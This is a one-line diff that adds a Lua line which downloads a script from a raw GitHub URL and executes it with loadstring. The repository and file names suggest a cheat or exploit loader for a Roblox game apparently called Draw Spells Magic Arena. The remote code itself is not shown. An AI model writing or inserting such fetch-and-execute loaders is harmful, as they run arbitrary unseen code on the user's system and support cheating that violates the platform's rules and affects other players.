@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/draw-spells-magic-arena-spam6-byue1ae1gyprxx.lua"))()
